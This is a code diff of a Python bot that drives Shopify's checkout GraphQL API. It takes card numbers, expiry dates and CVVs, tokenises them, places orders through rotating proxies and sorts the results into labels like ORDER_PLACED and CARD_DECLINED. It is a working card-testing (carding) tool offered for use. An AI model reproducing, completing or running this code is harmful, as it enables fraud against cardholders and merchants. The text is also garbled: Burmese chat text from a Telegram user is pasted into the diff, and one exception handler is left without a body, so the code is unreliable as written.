+                if 'currencyCode&quot;:&quot;' in txt: cur=eb(txt,'currencyCode&quot;:&quot;','&quot;') or 'USD'
+                elif '"currencyCode":"' in txt: cur=eb(txt,'"currencyCode":"','"') or 'USD'
+                sub=eb(txt,'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;','&quot;') or eb(txt,'"subtotalBeforeTaxesAndShipping":{"value":{"amount":"','"')
+                if not sub:
+                    pm=re.search(r'"price":\s*"([\d.]+)"',txt); sub=pm.group(1) if pm else "0.01"
+                ue=txt.replace('&quot;','"').replace('&amp;','&')
+                bid=None; bm=re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"',ue)
+                if bm: bid=bm.group(1)
+                stok=eb(txt,'name="serialized-sourceToken" content="','"')
+                if stok: stok=stok.replace('&quot;','').strip('"')
+                isig=None; im=re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',ue)
+                if im: isig=im.group(1)
+                if not sst: continue
+                H.update({'shopify-checkout-client':'checkout-web/1.0','shopify-checkout-source':f'id="{atk}", type="cn"',
+                          'x-checkout-one-session-token':sst,'sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin'})
+                if bid: H['x-checkout-web-build-id']=bid; H['x-checkout-web-deploy-stage']='production'; H['x-checkout-web-server-handling']='fast'; H['x-checkout-web-server-rendering']='yes'
+                if stok: H['x-checkout-web-source-id']=stok
+                params={'operationName':'Proposal'}
+                jd={'query':QUERY_PROPOSAL_SHIPPING,'variables':{
+                    'sessionInput':{'sessionToken':sst},'queueToken':qt or '','discounts':{'lines':[],'acceptUnexpectedDiscounts':True},
+                    'delivery':{'deliveryLines':[{'destination':{'partialStreetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}},'selectedDeliveryStrategy':{'deliveryStrategyMatchingConditions':{'estimatedTimeInTransit':{'any':True},'shipments':{'any':True}},'options':{}},'targetMerchandiseLines':{'any':True},'deliveryMethodTypes':['SHIPPING'],'expectedTotalPrice':{'any':True},'destinationChanged':True}],'noDeliveryRequired':[],'useProgressiveRates':False,'prefetchShippingRatesStrategy':None,'supportsSplitShipping':True},
+                    'deliveryExpectations':{'deliveryExpectationLines':[]},
+                    'merchandise':{'merchandiseLines':[{'stableId':sid or '1','merchandise':{'productVariantReference':{'id':f'gid://shopify/ProductVariantMerchandise/{mch}','variantId':f'gid://shopify/ProductVariant/{vid}','properties':[],'sellingPlanId':None,'sellingPlanDigest':None}},'quantity':{'items':{'value':1}},'expectedTotalPrice':{'value':{'amount':sub,'currencyCode':cur}},'lineComponentsSource':None,'lineComponents':[]}]},
+                    'payment':{'totalAmount':{'any':True},'paymentLines':[],'billingAddress':{'streetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}}},
+                    'buyerIdentity':{'customer':{'presentmentCurrency':cur,'countryCode':cc_c},'email':em,'emailChanged':False,'phoneCountryCode':cc_c,'marketingConsent':[{'email':{'value':em}}],'shopPayOptInPhone':{'countryCode':cc_c},'rememberMe':False},
+                    'tip':{'tipLines':[]},'taxes':{'proposedAllocations':None,'proposedTotalAmount':{'value':{'amount':'0','currencyCode':cur}},'proposedTotalIncludedAmount':None,'proposedMixedStateTotalAmount':None,'proposedExemptions':[]},
+                    'note':{'message':None,'customAttributes':[]},'localizationExtension':{'fields':[]},'nonNegotiableTerms':None,
+                    'scriptFingerprint':{'signature':None,'signatureUuid':None,'lineItemScriptChanges':[],'paymentScriptChanges':[],'shippingScriptChanges':[]},'optionalDuties':{'buyerRefusesDuties':False}},'operationName':'Proposal'}
+                gq=f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
+                for i in range(2):
+                    resp,rt_=await gql(s,gq,params,H,jd,px=pxs)
+                    if i==0: await asyncio.sleep(3)
+                if not resp: continue
+                if is_cap(rt_): return False,"CAPTCHA_REQUIRED",gw,tp,cur
+                try: rj=json.loads(rt_)
+                except: continue
+                if 'errors' in rj: return False,f"GQL: {'; '.join(e.get('message','') for e in rj['errors'][:2])}",gw,tp,cur
                 try:
-                    pr=json.loads(ft); rd=pr.get('data',{}).get('receipt',{})
-                    if rd:
-                        tn=rd.get('__typename','')
-                        if tn=='ProcessedReceipt': return True,"ORDER_PLACED",gw,tp,cur
-                        elif tn=='FailedReceipt':
-                            er=rd.get('processingError',{}); et=er.get('__typename','')
-                            if et=='PaymentFailed':
-                                c=er.get('code',''); msg=er.get('messageUntranslated','')
-                                if c in ('GENERIC_ERROR','PAYMENT_FAILED','') and msg: return True,msg,gw,tp,cur
-                                return True,c or 'PAYMENT_FAILED',gw,tp,cur
-                            return True,er.get('code') or et or 'UNKNOWN',gw,tp,cur
-                        elif tn=='ActionRequiredReceipt': return True,"OTP_REQUIRED",gw,tp,cur
-                        if tn in ['ProcessingReceipt','WaitingReceipt']: await asyncio.sleep(4); continue
+                    sess_=rj['data']['session']; neg=sess_['negotiate']; res=neg['result']
+                    rty=res.get('__typename','')
+                    if rty=='CheckpointDenied': return False,"Checkpoint Denied",gw,tp,cur
+                    if rty=='Throttled': return False,"Throttled",gw,tp,cur
+                    if rty=='NegotiationResultFailed': return False,"Negotiation failed",gw,tp,cur
+                    cpd=res.get('checkpointData'); sel=res['sellerProposal']; dv=sel.get('delivery'); rt=sel['runningTotal']['value']['amount']
+                except (KeyError,TypeError) as e: continue
+                dst=''; shp=0.0
+                if dv and dv.get('__typename')=='FilledDeliveryTerms':
+                    dl=dv.get('deliveryLines',[{}]); av=dl[0].get('availableDeliveryStrategies',[]) if dl else []
+                    if av:
+                        dst=av[0].get('handle','')
+                        try: shp=float(av[0].get('amount',{}).get('value',{}).get('amount','0'))
+                        except: shp=0.0
+                try:
+                    tx=sel.get('tax',{}); txm=float(tx.get('totalTaxAmount',{}).get('value',{}).get('amount','0')) if tx.get('__typename')=='FilledTaxTerms' else 0.0
+                except: txm=0.0
+                pd=sel.get('payment',{})
+                if pd.get('__typename')=='FilledPaymentTerms':
+                    for mt in pd.get('availablePaymentLines',[]):
+                        pmm=mt.get('paymentMethod',{})
+                        if pmm.get('name') or pmm.get('paymentMethodIdentifier'):
+                            pid=pmm.get('paymentMethodIdentifier'); gw=pmm.get('extensibilityDisplayName') or pmm.get('name','UNKNOWN'); tp=str(float(rt)+shp+txm); break
+                if not pid: continue
+                jd['query']=QUERY_PROPOSAL_DELIVERY
+                jd['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy']={'deliveryStrategyByHandle':{'handle':dst or '','customDeliveryRate':False},'options':{}}
+                jd['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines']={'lines':[{'stableId':sid or '1'}]}
+                jd['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice']={'value':{'amount':str(shp),'currencyCode':cur}}
+                jd['variables']['delivery']['deliveryLines'][0]['destinationChanged']=False
+                jd['variables']['taxes']['proposedTotalAmount']['value']['amount']=str(txm)
+                jd['variables']['buyerIdentity']['shopPayOptInPhone']['number']=ph
+                resp,rt_=await gql(s,gq,params,H,jd,px=pxs)
+                if is_cap(rt_): return False,"CAPTCHA delivery",gw,tp,cur
+                pl={"credit_card":{"number":cc,"month":int(mes),"year":int(ano),"verification_value":cvv,"start_month":None,"start_year":None,"issue_number":"","name":f"{fn} {ln}"},"payment_session_scope":urlparse(ourl).netloc}
+                vh={'Content-Type':'application/json','Accept':'application/json','Accept-Language':'en-US,en;q=0.9','Origin':'https://checkout.pci.shopifyinc.com','Referer':'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36'}
+                if isig: vh['shopify-identification-signature']=isig
+                resp=await s.post('https://checkout.pci.shopifyinc.com/sessions',json=pl,headers=vh,proxy=pxs)
+                try:
+                    td=await resp.json(); tok=td.get('id')
+                    if not tok: continue
+                except Exception as e: continue
+                
+                params={'operationName':'SubmitForCompletion'}
+                sv={'input':{
+                    'sessionInput':{'sessionToken':sst},'queueToken':qt or '','discounts':{'lines':[],'acceptUnexpectedDiscounts':True},
+                    'delivery':{'deliveryLines':[{'destination':{'streetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}},'selectedDeliveryStrategy':{'deliveryStrategyByHandle':{'handle':dst or '','customDeliveryRate':False},'options':{'phone':ph}},'targetMerchandiseLines':{'lines':[{'stableId':sid or '1'}]},'deliveryMethodTypes':['SHIPPING'],'expectedTotalPrice':{'value':{'amount':str(shp),'currencyCode':cur}},'destinationChanged':False}],'noDeliveryRequired':[],'useProgressiveRates':True,'prefetchShippingRatesStrategy':None,'supportsSplitShipping':True},
+                    'merchandise':{'merchandiseLines':[{'stableId':sid or '1','merchandise':{'productVariantReference':{'id':f'gid://shopify/ProductVariantMerchandise/{mch}','variantId':f'gid://shopify/ProductVariant/{vid}','properties':[],'sellingPlanId':None,'sellingPlanDigest':None}},'quantity':{'items':{'value':1}},'expectedTotalPrice':{'value':{'amount':sub,'currencyCode':cur}},'lineComponentsSource':None,'lineComponents':[]}]},
+                    'payment':{'totalAmount':{'any':True},'paymentLines':[{'paymentMethod':{'directPaymentMethod':{'paymentMethodIdentifier':pid,'sessionId':tok,'billingAddress':{'streetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}},'cardSource':None}},'amount':{'value':{'amount':rt,'currencyCode':cur}},'dueAt':None}],'billingAddress':{'streetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}}},
+                    'buyerIdentity':{'customer':{'presentmentCurrency':cur,'countryCode':cc_c},'email':em,'emailChanged':False,'phoneCountryCode':cc_c,'marketingConsent':[{'email':{'value':em}}],'shopPayOptInPhone':{'number':ph,'countryCode':cc_c},'rememberMe':False},
+                    'taxes':{'proposedAllocations':None,'proposedTotalAmount':{'value':{'amount':str(txm),'currencyCode':cur}},'proposedTotalIncludedAmount':None,'proposedMixedStateTotalAmount':None,'proposedExemptions':[]},
+                    'tip':{'tipLines':[]},'note':{'message':None,'customAttributes':[]},'localizationExtension':{'fields':[]},'nonNegotiableTerms':None,'optionalDuties':{'buyerRefusesDuties':False}},'attemptToken':atk,'metafields':[],'analytics':{'requestUrl':curl}}
+                if cpd: sv['input']['checkpointData']=cpd
+                sj={'query':MUTATION_SUBMIT,'variables':sv,'operationName':'SubmitForCompletion'}
+                resp,txt=await gql(s,gq,params,H,sj,px=pxs)
+                if is_cap(txt): return False,"CAPTCHA submit",gw,tp,cur
+                if "Your order total has changed." in txt: return False,"Site not supported",gw,tp,cur
+                if "The requested payment method is not available." in txt: return False,"Payment not available",gw,tp,cur
+                
+                try:
+                    rj=json.loads(txt); sd=rj.get('data',{}).get('submitForCompletion',{})
+                    if not sd:
+                        for e in rj.get('errors',[]):
+                            if e.get('code'): return False,e['code'],gw,tp,cur
+                        return False,"Empty submit",gw,tp,cur
+                    rty=sd.get('__typename','')
+                    if rty in ['SubmitSuccess','SubmittedForCompletion','SubmitAlreadyAccepted']:
+                        rc=sd.get('receipt',{})
+                        if rc:
+                            if rc.get('__typename')=='ProcessedReceipt': return True,"ORDER_PLACED",gw,tp,cur
+                            rid=rc.get('id')
+                        else: return False,"No receipt",gw,tp,cur
+                    elif rty=='SubmitFailed': return False,clean_r(sd.get('reason','Unknown')),gw,tp,cur
+                    elif rty=='SubmitRejected':
+                        for e in sd.get('errors',[]):
+                            c=e.get('code','')
+                            if c in ('GENERIC_ERROR','PAYMENT_FAILED',''):
+                                d=e.get('localizedMessage') or e.get('nonLocalizedMessage')
+                                if d: return False,d,gw,tp,cur
+                            if c: return False,c,gw,tp,cur
+                        return False,"Submit Rejected",gw,tp,cur
+                    elif rty=='Throttled': return False,"Throttled",gw,tp,cur
+                    rc=sd.get('receipt',{})
+                    if not rc: return False,"No receipt",gw,tp,cur
+                    rid=rc.get('id')
+                    if not rid: return False,"No receipt ID",gw,tp,cur
+                except: return False,"Bad submit JSON",gw,tp,cur
+                
+                params={'operationName':'PollForReceipt'}
+                pj={'query':QUERY_POLL,'variables':{'receiptId':rid,'sessionToken':sst},'operationName':'PollForReceipt'}
+                await asyncio.sleep(3)
+                ft=""
+                for i in range(4):
+                    resp,ft=await gql(s,gq,params,H,pj,px=pxs)
+                    if is_cap(ft): return True,"CARD_DECLINED",gw,tp,cur
+                    try:
+                        pr=json.loads(ft); rd=pr.get('data',{}).get('receipt',{})
+                        if rd:
+                            tn=rd.get('__typename','')
+                            if tn=='ProcessedReceipt': return True,"ORDER_PLACED",gw,tp,cur
+                            elif tn=='FailedReceipt':
+                                er=rd.get('processingError',{}); et=er.get('__typename','')
+                                if et=='PaymentFailed':
+                                    c=er.get('code',''); msg=er.get('messageUntranslated','')
+                                    if c in ('GENERIC_ERROR','PAYMENT_FAILED','') and msg: return True,msg,gw,tp,cur
+                                    return True,c or 'PAYMENT_FAILED',gw,tp,cur
+                                return True,er.get('code') or et or 'UNKNOWN',gw,tp,cur
+                            elif tn=='ActionRequiredReceipt': return True,"OTP_REQUIRED",gw,tp,cur
+                            if tn in ['ProcessingReceipt','WaitingReceipt']: await asyncio.sleep(4); continue
+                    except: pass
+                    if 'WaitingReceipt' in ft: await asyncio.sleep(4)
+                    else: break
+                if 'WaitingReceipt' in ft: return False,"Change Proxy",gw,tp,cur
+                try:
+                    rj=json.loads(ft); result=rj.get('data',{}).get('receipt',{}).get('processingError',{}).get('code')
+                    if "shopify_payments" in str(rj) and "DECLINED" not in str(rj): return True,"ORDER_PLACED",gw,tp,cur
+                    elif result: return True,result,gw,tp,cur
+                    return True,"MISMATCHED_BILL",gw,tp,cur
                 except: pass
-                if 'WaitingReceipt' in ft: await asyncio.sleep(4)
-                else: break
-            if 'WaitingReceipt' in ft: return False,"Change Proxy",gw,tp,cur
-            try:
-                rj=json.loads(ft); result=rj.get('data',{}).get('receipt',{}).get('processingError',{}).get('code')
-                if "shopify_payments" in str(rj) and "DECLINED" not in str(rj): return True,"ORDER_PLACED",gw,tp,cur
-                elif result: return True,result,gw,tp,cur
-                return True,"MISMATCHED_BILL",gw,tp,cur
-            except: pass
-            return False,"Unknown Result",gw,tp,cur
-    except Exception as e: 
-        remove_dead_proxy(px)
-        return False,f"Error: {e}",gw,tp,cur
+                return False,"Unknown Result",gw,tp,cur
+        except Exception as e: 
+            
+            
+    time.sleep(3)
+    return False,"Error: Both Proxy & Direct Failed",gw,tp,cur
+
+[@veinfearr on telegram] မပြီးသေးဘူး၊ ငါ့စာသားတွေ ထပ်ပြတ်သွားတယ်။ ခုနက ပေးလိုက်တဲ့ Code ရဲ့ အောက်ဆုံးမှာ ဒီအပိုင်းလေးတွေ ထပ်ထည့်ပေးပါ။
+
+(ခုနက ပေးလိုက်တဲ့ Code ရဲ့ အောက်ဆုံးမှာ ဆက်ထည့်ပါ)
+
+```python
 
 def parse_cc(s):
     p=s.split('|')
@@ -897,3 +879,4 @@ if __name__=="__main__":
     print(f"{C.LIME}{C.B}  ⚡ Bot is live  ⚡{C.R}")
     print(f"{C.D}  Flask: http://0.0.0.0:8000{C.R}\n")
     app.run(host="0.0.0.0",port=8000,debug=False)
+```
